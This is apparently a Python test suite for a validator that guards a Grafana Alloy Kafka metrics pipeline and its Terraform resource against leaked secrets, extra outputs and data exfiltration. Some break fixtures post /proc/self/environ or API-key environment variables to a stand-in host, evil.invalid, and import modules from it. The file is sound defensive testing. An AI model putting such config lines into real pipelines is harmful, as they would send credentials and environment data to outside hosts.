# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 Valesor Development

"""`make pipelines-check` (AW-INF-051 AC-5) and shared-kafka's allow-list and output (AC-13).

Each break below changes the committed shared-kafka.alloy one way and must be refused, naming the file;
each accept must still pass. They run the pinned bin/alloy, which `make bootstrap` installs.
"""
import contextlib
import io
import os
import re
import shutil
import sys
import tempfile
import unittest

REPO = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, os.path.join(REPO, "scripts"))
import pipelines_check  # noqa: E402

SHARED_KAFKA = os.path.join(pipelines_check.PIPELINES, "shared-kafka.alloy")
HAVE_ALLOY = os.access(pipelines_check.ALLOY, os.X_OK)
OTHER_URL = "https://prometheus-prod-67-prod-us-west-0.grafana.net/api/prom/push"

# The names shared-kafka keeps: ADR-0014 §6's set as the Strimzi Metrics Reporter serves them (AC-12),
# read at :9404 from quay.io/strimzi/kafka:1.2.0-kafka-4.3.1 on 2026-10-22, and its job's up. The ADR's
# `isrshrinks_total` and `isrexpands_total` are served as `isrshrinkspersec_total` and `isrexpandspersec_total`.
KEPT = {
    "kafka_server_replicamanager_underreplicatedpartitions",
    "kafka_server_replicamanager_underminisrpartitioncount",
    "kafka_server_replicamanager_atminisrpartitioncount",
    "kafka_server_replicamanager_isrshrinkspersec_total",
    "kafka_server_replicamanager_isrexpandspersec_total",
    "kafka_controller_kafkacontroller_offlinepartitionscount",
    "kafka_controller_kafkacontroller_activecontrollercount",
    "up",
}


def _append(block):
    return lambda s: s + "\n" + block + "\n"


def _replace(old, new):
    def f(s):
        assert old in s, "fixture setup: %r not in shared-kafka.alloy" % old
        return s.replace(old, new, 1)
    return f


AUTH = 'endpoint {\n\t\turl = "%s"\n' % pipelines_check.RECEIVER
EVIL = "https://evil.invalid/push"


def _auth(attrs):
    """basic_auth inside the receiver's endpoint, holding attrs."""
    return _replace(AUTH, AUTH + "\n\t\tbasic_auth {\n" + "".join("\t\t\t%s\n" % a for a in attrs) + "\t\t}\n")


# (name, change, rule the refusal names). Each is the committed source broken one way.
BREAKS = [
    ("a Grafana Cloud token", _append("// glc_eyJvIjoiMSJ9"), "secret"),
    ("a service-account token in a string", _replace('regex         = "andara-kafka"',
                                                     'regex         = "glsa_abc_123"'), "secret"),
    ("basic auth in a URL", _replace(pipelines_check.RECEIVER, "http://u:p@k8s-monitoring-alloy-receiver.observability.svc:9090/api/v1/metrics/write"), "secret"),
    ("a literal password", _auth(['username = "1"', 'password = "hunter2hunter2"']), "credential"),
    ("a password file", _auth(['username      = "1"', 'password_file = "/var/run/secrets/token"']), "credential"),
    ("a literal bearer token", _replace(AUTH, AUTH + '\t\tbearer_token = "abc"\n'), "credential"),
    ("a header map", _replace(AUTH, AUTH + '\t\theaders = {"Authorization" = "Bearer x"}\n'), "credential"),
    ("scrape http_headers", _replace("\ttargets    = discovery.relabel.shared_kafka.output\n",
                                     '\ttargets      = discovery.relabel.shared_kafka.output\n'
                                     '\thttp_headers = {"X-Key" = ["abc"]}\n'), "credential"),
    ("a sigv4 access key", _replace(AUTH, AUTH + '\n\t\tsigv4 {\n\t\t\taccess_key = "AKIA0000"\n\t\t}\n'), "credential"),
    ("a sigv4 secret key", _replace(AUTH, AUTH + '\n\t\tsigv4 {\n\t\t\tsecret_key = "s3cr3t"\n\t\t}\n'), "credential"),
    ("a templatefile call", _replace('names = ["andara-shared"]', 'names = [templatefile("x", {})]'), "templatefile"),
    ("a remote_write to Grafana Cloud", _replace(pipelines_check.RECEIVER, OTHER_URL), "remote_write"),
    ("a second remote_write endpoint", _replace(AUTH, AUTH + '\t}\n\n\tendpoint {\n\t\turl = "%s"\n' % OTHER_URL),
     "remote_write"),
    ("a concatenated remote_write url", _replace('url = "%s"' % pipelines_check.RECEIVER,
                                                 'url = "http://" + "k8s-monitoring-alloy-receiver.observability.svc:9090/api/v1/metrics/write"'),
     "remote_write"),
    ("the receiver plus a path", _replace('url = "%s"' % pipelines_check.RECEIVER,
                                          'url = "%s" + "/../../x"' % pipelines_check.RECEIVER), "remote_write"),
    ("a proxy", _replace(AUTH, AUTH + '\t\tproxy_url = "http://proxy.invalid:3128"\n'), "remote_write"),
    ("a second remote_write, its name spaced", _append('prometheus . remote_write "c" {\n\tendpoint {\n\t\turl = "%s"\n\t}\n}' % EVIL),
     "remote_write"),
    ("a remote_write split across lines", _append('prometheus.\nremote_write "c" {\n\tendpoint {\n\t\turl = "%s"\n\t}\n}' % EVIL),
     "remote_write"),
    ("an otelcol exporter", _append('otelcol.exporter.otlphttp "cloud" {\n\tclient {\n\t\tendpoint = "https://otlp.invalid"\n\t}\n}'),
     "writer"),
    ("an otelcol exporter, spaced", _append('otelcol . exporter . otlphttp "c" {\n\tclient {\n\t\tendpoint = "https://otlp.invalid"\n\t}\n}'),
     "writer"),
    ("a loki.write", _append('loki.write "cloud" {\n\tendpoint {\n\t\turl = "https://logs.invalid/loki/api/v1/push"\n\t}\n}'),
     "writer"),
    ("a loki.write with a comment in its name", _append('loki./* x */write "c" {\n\tendpoint {\n\t\turl = "https://logs.invalid/push"\n\t}\n}'),
     "writer"),
    ("a pyroscope.write", _append('pyroscope.write "c" {\n\tendpoint {\n\t\turl = "https://profiles.invalid"\n\t}\n}'),
     "writer"),
    ("a module import over http", _append('import.http "m" {\n\turl = "https://evil.invalid/mod.alloy"\n}'), "component"),
    ("a module import from git", _append('import.git "m" {\n\trepository = "https://evil.invalid/m.git"\n\tpath       = "m.alloy"\n}'),
     "component"),
    ("the environment read from a file and posted",
     _append('local.file "env" {\n\tfilename = "/proc/self/environ"\n}\n\nremote.http "out" {\n\turl    = "https://evil.invalid/"\n'
             '\tmethod = "POST"\n\tbody   = local.file.env.content\n}'), "component"),
    ("a top-level attribute", _append('x = 1'), "component"),
    ("sys.env of a name env-allow.txt doesn't list", _auth(['username = "1"', 'password = sys.env("GRAFANA_TELEMETRY_TOKEN")']),
     "sys.env"),
    ("sys.env of a computed name", _auth(['username = "1"', 'password = sys.env("PG_" + "PASSWORD")']), "sys.env",
     "PG_PASSWORD\nPG_\nPASSWORD\n"),
    ("a password file, even from a listed variable",
     _auth(['username      = "1"', 'password_file = sys.env("PG_MONITOR_PASSWORD")']), "credential", "PG_MONITOR_PASSWORD\n"),
    ("sys.env through a list", _replace('role = "pod"', 'role       = "pod"\n\tapi_server = "https://evil.invalid/" + [sys.env][0]("GCLOUD_FM_API_KEY")'),
     "sys.env", "GCLOUD_FM_API_KEY\n"),
    ("sys.env in parentheses", _replace('role = "pod"', 'role       = "pod"\n\tapi_server = "https://evil.invalid/" + (sys.env)("GCLOUD_FM_API_KEY")'),
     "sys.env", "GCLOUD_FM_API_KEY\n"),
    ("sys indexed", _replace('role = "pod"', 'role       = "pod"\n\tapi_server = "https://evil.invalid/" + sys["env"]("GCLOUD_FM_API_KEY")'),
     "sys.env", "GCLOUD_FM_API_KEY\n"),
    ("the deprecated env()", _replace('role = "pod"', 'role       = "pod"\n\tapi_server = "https://evil.invalid/" + env("GCLOUD_FM_API_KEY")'),
     "sys.env", "GCLOUD_FM_API_KEY\n"),
    ("a reference alloy validate refuses", _replace("forward_to = [prometheus.relabel.shared_kafka.receiver]",
                                                    "forward_to = [prometheus.relabel.nope.receiver]"),
     "alloy validate"),
    ("a source alloy fmt would change", _replace('\trole = "pod"', '    role = "pod"'), "alloy fmt"),
]

# (name, change, env-allow.txt) that must still pass.
ACCEPTS = [
    ("the committed source", lambda s: s, ""),
    ("loki.write and templatefile named in a comment", _append("// no loki.write, no templatefile(), no otelcol.exporter.otlp"), ""),
    ("sys.env of a listed name", _auth(['username = "1"', 'password = sys.env("PG_MONITOR_PASSWORD")']),
     "PG_MONITOR_PASSWORD\n"),
]


@unittest.skipUnless(HAVE_ALLOY or os.environ.get("CI"), "bin/alloy absent; make bootstrap installs it")
class Check(unittest.TestCase):
    def setUp(self):
        self.dir = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.dir)
        with open(SHARED_KAFKA) as f:
            self.source = f.read()

    def run_on(self, text, allow=""):
        with open(os.path.join(self.dir, "shared-kafka.alloy"), "w") as f:
            f.write(text)
        with open(os.path.join(self.dir, "env-allow.txt"), "w") as f:
            f.write(allow)
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            rc = pipelines_check.main(["--dir", self.dir])
        return rc, out.getvalue() + err.getvalue()

    def test_each_break_is_refused_naming_the_file(self):
        for name, change, rule, *allow in BREAKS:
            with self.subTest(name):
                rc, out = self.run_on(change(self.source), *allow)
                self.assertEqual(rc, 1, out)
                self.assertRegex(out, r"refused: .*shared-kafka\.alloy:\d+: %s: " % re.escape(rule))

    def test_each_sys_env_form_is_refused_as_a_form(self):
        """A form break lists its variable in env-allow.txt, so only the form rule can refuse it."""
        forms = [b for b in BREAKS if b[2] == "sys.env" and len(b) == 4]
        self.assertEqual(len(forms), 5)
        for name, change, rule, allow in forms:
            with self.subTest(name):
                rc, out = self.run_on(change(self.source), allow)
                self.assertEqual(rc, 1, out)
                self.assertIn("the name one string literal", out)
                self.assertNotIn("is not in env-allow.txt", out)

    def test_a_url_that_is_not_one_literal_says_so(self):
        """The (not one string literal) branch: a raw string holding exactly the receiver is refused too."""
        for value in ("`%s`" % pipelines_check.RECEIVER, '"%s" + "/x"' % pipelines_check.RECEIVER):
            with self.subTest(value):
                rc, out = self.run_on(self.source.replace('"%s"' % pipelines_check.RECEIVER, value, 1))
                self.assertEqual(rc, 1, out)
                self.assertIn("url (not one string literal) is not the receiver", out)

    def test_each_accept_passes(self):
        for name, change, allow in ACCEPTS:
            with self.subTest(name):
                rc, out = self.run_on(change(self.source), allow)
                self.assertEqual(rc, 0, out)

    def test_the_committed_pipelines_pass(self):
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            self.assertEqual(pipelines_check.main([]), 0)
        self.assertIn("shared-kafka.alloy", out.getvalue())

    def test_env_allow_is_committed_empty(self):
        with open(os.path.join(pipelines_check.PIPELINES, "env-allow.txt")) as f:
            self.assertEqual(f.read(), "")

    def test_a_missing_env_allow_or_no_pipeline_fails(self):
        rc, out = self.run_on(self.source)
        os.remove(os.path.join(self.dir, "env-allow.txt"))
        with contextlib.redirect_stderr(io.StringIO()) as err:
            self.assertEqual(pipelines_check.main(["--dir", self.dir]), 1)
        self.assertIn("env-allow.txt", err.getvalue())
        os.remove(os.path.join(self.dir, "shared-kafka.alloy"))
        open(os.path.join(self.dir, "env-allow.txt"), "w").close()
        with contextlib.redirect_stderr(io.StringIO()) as err:
            self.assertEqual(pipelines_check.main(["--dir", self.dir]), 1)
        self.assertIn("no pipeline", err.getvalue())


PIPELINES_TF = os.path.join(pipelines_check.GRAFANA, "stacks", "solo7dev", "pipelines.tf")
RESOURCE_LINE = 'contents                   = file("${path.module}/../../pipelines/shared-kafka.alloy")'
INLINE = '"prometheus.scrape \\"x\\" {}"'
HERE = "stacks/solo7dev/pipelines.tf"
TYPE = pipelines_check.PIPELINE_TYPE
INLINE_RESOURCE = 'resource "%s" "x" {\n  name     = "x"\n  contents = %s\n}\n' % (TYPE, INLINE)


@unittest.skipUnless(HAVE_ALLOY or os.environ.get("CI"), "bin/alloy absent; make bootstrap installs it")
class Resources(unittest.TestCase):
    """A grafana_fleet_management_pipeline is declared only in stacks/<root>/pipelines.tf and reads one
    checked source with one literal file()."""

    def setUp(self):
        self.tf_dir = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.tf_dir)
        with open(PIPELINES_TF) as f:
            self.tf = f.read()
        self.assertIn(RESOURCE_LINE, self.tf)

    def run_on(self, files):
        for rel, text in files.items():
            path = os.path.join(self.tf_dir, rel)
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "w") as f:
                f.write(text)
        out = io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(io.StringIO()):
            rc = pipelines_check.main(["--tf-dir", self.tf_dir])
        return rc, out.getvalue()

    def fresh(self, files):
        shutil.rmtree(self.tf_dir)
        os.mkdir(self.tf_dir)
        return self.run_on(files)

    def test_the_committed_tree_passes(self):
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            self.assertEqual(pipelines_check.main([]), 0)

    def test_each_accept_passes(self):
        """The committed resource, and text a hand scanner misreads, read as Terraform reads it."""
        accepts = [
            ("the committed resource", self.tf),
            ("a comment naming contents, and an unbalanced }",
             self.tf.replace("  matchers ", "  # contents = file(...) is the only form; } {\n  matchers ")),
            ("a # comment holding a }", self.tf.replace("  enabled ", "  # }\n  enabled ")),
            ("a string holding \\\" and }", self.tf.replace("  enabled ", '  description = "a \\" }"\n  enabled ')),
            ("an interpolation holding a \"}\"", self.tf.replace("  enabled ", '  description = "${"}"}"\n  enabled ')),
            ("a $${ escape", self.tf.replace("  enabled ", '  description = "$${x} %%{y}"\n  enabled ')),
            ("a module with a relative source", self.tf + '\nmodule "m" {\n  source = "../../modules/stack"\n}\n'),
        ]
        for name, tf in accepts:
            with self.subTest(name):
                rc, out = self.fresh({HERE: tf})
                self.assertEqual(rc, 0, out)

    def test_each_break_is_refused(self):
        """(name, files, what the refusal says). Each break fails one rule, and only that rule's refusal counts."""
        good = self.tf
        exact = "contents must be exactly"
        declared = "is declared only in stacks/<root>/pipelines.tf"
        elsewhere = "and is named nowhere else"
        one = "no for_each, count or dynamic"
        module = "its source must be a relative path inside"
        breaks = [
            ("an inline heredoc", {HERE: good.replace(RESOURCE_LINE, 'contents = <<-EOT\n    loki.write "c" {}\n  EOT')}, exact),
            ("a source outside pipelines/", {HERE: good.replace("../../pipelines/shared-kafka.alloy", "evil.alloy")}, exact),
            ("a pipelines path that climbs out again",
             {HERE: good.replace("pipelines/shared-kafka.alloy", "pipelines/shared-kafka.alloy/../env-allow.txt")}, exact),
            ("a source written with %{", {HERE: good.replace("${path.module}", "%{if true}x%{endif}")}, exact),
            ("a source that does not exist",
             {HERE: good.replace("pipelines/shared-kafka.alloy", "pipelines/nope.alloy").replace('"shared-kafka"', '"nope"')},
             "pipelines/nope.alloy does not exist"),
            ("a name that is not its source's", {HERE: good.replace('"shared-kafka"', '"other"', 1)}, "name must be"),
            ("a for_each", {HERE: good.replace("  enabled ", '  for_each = toset(["a"])\n  enabled ')}, one),
            ("a count", {HERE: good.replace("  enabled ", "  count = 2\n  enabled ")}, one),
            ("a dynamic block", {HERE: good.replace("  enabled ", '  dynamic "x" {\n    for_each = []\n    content {}\n  }\n  enabled ')},
             one),
            ("a second resource with inline contents", {HERE: good + "\n" + INLINE_RESOURCE}, exact),
            ("two contents lines", {HERE: good.replace(RESOURCE_LINE, RESOURCE_LINE + "\n  " + RESOURCE_LINE)}, exact),
            ("the real contents in a comment, a column-0 line, then inline contents",
             {HERE: good.replace(RESOURCE_LINE, "/*\n  " + RESOURCE_LINE + "\nx\n*/\n  contents = " + INLINE)}, exact),
            ("a heredoc whose closer is at column 0, then inline contents",
             {HERE: good.replace("  matchers ", "  labels   = [<<-eot\n" + RESOURCE_LINE + "\neot\n  ]\n  matchers ")
                         .replace(RESOURCE_LINE, "contents = " + INLINE, 1)}, exact),
            ("a good contents line and a } in a block comment, then inline contents",
             {HERE: good.replace(RESOURCE_LINE, "/*\n  " + RESOURCE_LINE + "\n}\n*/\n  contents = " + INLINE)}, exact),
            ("a good contents line and a } in a heredoc, then inline contents",
             {HERE: good.replace(RESOURCE_LINE, "labels = <<-EOT\n    " + RESOURCE_LINE + "\n    }\n  EOT\n  contents = " + INLINE)},
             exact),
            # A hand scanner read "$${" as an interpolation and the code after it as string.
            ("a $${ escape hiding a second contents",
             {HERE: good.replace(RESOURCE_LINE, RESOURCE_LINE + '\n  description = "$${"\n  contents = var.stack\n  x = "}"')},
             exact),
            ("a %%{ escape hiding a second contents",
             {HERE: good.replace(RESOURCE_LINE, RESOURCE_LINE + '\n  description = "%%{"\n  contents = var.stack\n  x = "}"')},
             exact),
            # A heredoc closer inside a ${ } that spans lines does not close the heredoc.
            ("a heredoc closer inside an interpolation, then inline contents",
             {HERE: good.replace(RESOURCE_LINE, "description = <<-EOT\n    ${<<-INNER\n    EOT\n    " + RESOURCE_LINE
                                 + "\n    INNER\n    }\n  EOT\n  contents = " + INLINE)}, exact),
            ("the good resource in a module", {HERE: good, "modules/stack/fleet.tf": good}, declared),
            ("the good resource in another file of the root", {HERE: good, "stacks/solo7dev/main.tf": good}, declared),
            ("the good resource in a module's pipelines.tf", {"modules/stack/pipelines.tf": good}, declared),
            ("the good resource in a pipelines.tf below a root", {"stacks/solo7dev/sub/pipelines.tf": good}, declared),
            ("the type named only as a reference, in another file",
             {HERE: good, "stacks/solo7dev/outputs.tf": 'output "p" {\n  value = %s.shared_kafka.id\n}\n' % TYPE}, declared),
            ("an import block naming the type",
             {HERE: good + '\nimport {\n  to = %s.shared_kafka\n  id = "shared-kafka"\n}\n' % TYPE}, elsewhere),
            # Terraform decodes a label's escapes: this is a pipeline resource with inline contents.
            ("a type label written with an escape",
             {HERE: good + "\n" + INLINE_RESOURCE.replace(TYPE, TYPE[:-1] + "\\u0065")}, exact),
            ("the type named in a string, written with escapes",
             {HERE: good.replace("  enabled ", '  description = "%s\\u005Fpipeline"\n  enabled ' % TYPE[:-len("_pipeline")])},
             elsewhere),
            ("the type named in a string", {HERE: good.replace("  enabled ", '  description = "%s"\n  enabled ' % TYPE)},
             elsewhere),
            ("a data source of the type", {HERE: good + '\ndata "%s" "x" {}\n' % TYPE}, elsewhere),
            ("a resource nested in a block", {HERE: good + '\nlocals {\n  resource "%s" "x" {}\n}\n' % TYPE}, elsewhere),
            ("a module from the registry", {HERE: good + '\nmodule "m" {\n  source = "evil/pipelines/grafana"\n}\n'}, module),
            ("a module from git", {HERE: good + '\nmodule "m" {\n  source = "git::https://evil.invalid/m.git"\n}\n'}, module),
            ("a module outside the tree", {HERE: good + '\nmodule "m" {\n  source = "../../../../evil"\n}\n'}, module),
            ("a module source climbing out through escapes",
             {HERE: good + '\nmodule "m" {\n  source = "./\\u002e\\u002e/\\u002e\\u002e/\\u002e\\u002e/\\u002e\\u002e/evil"\n}\n'},
             module),
            ("an unparseable file", {HERE: good, "stacks/solo7dev/main.tf": 'locals {\n  a = "\n}\n'}, "not parseable"),
            ("a .tf.json", {HERE: good, "stacks/solo7dev/override.tf.json": "{}"}, ".tf.json"),
        ]
        for name, files, detail in breaks:
            with self.subTest(name):
                rc, out = self.fresh(files)
                self.assertEqual(rc, 1, out)
                self.assertRegex(out, r"refused: .*\.tf(\.json)?:\d+: terraform: .*%s" % re.escape(detail))


class Usage(unittest.TestCase):
    def test_no_alloy_exits_2(self):
        with contextlib.redirect_stderr(io.StringIO()) as err:
            self.assertEqual(pipelines_check.main(["--alloy", "/nonexistent/alloy"]), 2)
        self.assertIn("make bootstrap", err.getvalue())


class SharedKafka(unittest.TestCase):
    """AC-13: the allow-list AC-12 recorded, no per-topic series, and the receiver as the one output."""

    def setUp(self):
        with open(SHARED_KAFKA) as f:
            self.text = f.read()
        self.code = pipelines_check.code_only(self.text)

    def blocks(self, kind):
        return [m for m in re.finditer(r"^%s\s+\"([^\"]*)\"\s*\{" % re.escape(kind), self.code, re.M)]

    def test_keeps_exactly_the_recorded_names(self):
        relabels = self.blocks("prometheus.relabel")
        self.assertEqual(len(relabels), 1)
        body = self.text[relabels[0].end():pipelines_check.block_end(self.code, relabels[0].end())]
        keeps = re.findall(r'regex\s*=\s*"([^"]*)"\s*\n\s*action\s*=\s*"keep"', body)
        self.assertEqual(len(keeps), 1, "one keep rule on __name__")
        names = keeps[0].split("|")
        self.assertTrue(all(re.fullmatch(r"[a-z_:][a-z0-9_:]*", n) for n in names), names)
        self.assertEqual(set(names), KEPT)
        self.assertFalse([n for n in names if n.startswith("kafka_server_brokertopicmetrics_")])

    def test_one_output_the_receiver(self):
        writes = self.blocks("prometheus.remote_write")
        self.assertEqual(len(writes), 1)
        body = self.text[writes[0].end():pipelines_check.block_end(self.code, writes[0].end())]
        self.assertEqual(re.findall(r'url\s*=\s*"([^"]*)"', body), [pipelines_check.RECEIVER])
        relabel = self.blocks("prometheus.relabel")[0]
        rbody = self.text[relabel.end():pipelines_check.block_end(self.code, relabel.end())]
        self.assertEqual(re.findall(r"forward_to\s*=\s*\[([^\]]*)\]", rbody),
                         ["prometheus.remote_write.%s.receiver" % self.text[writes[0].start(1):writes[0].end(1)]])
        for kind in ("loki.write", "otelcol.exporter.", "pyroscope.write"):
            self.assertNotIn(kind, self.code)

    def test_sets_namespace_and_job_and_no_environment(self):
        targets = re.findall(r'target_label\s*=\s*"([^"]*)"', self.text)
        self.assertIn("namespace", targets)
        self.assertIn("job", targets)
        self.assertNotIn("environment", targets)
        self.assertIn('names = ["andara-shared"]', self.text)
        self.assertIn('regex         = "andara-kafka"', self.text)
        self.assertIn('replacement   = "$1:9404"', self.text)


if __name__ == "__main__":
    unittest.main()
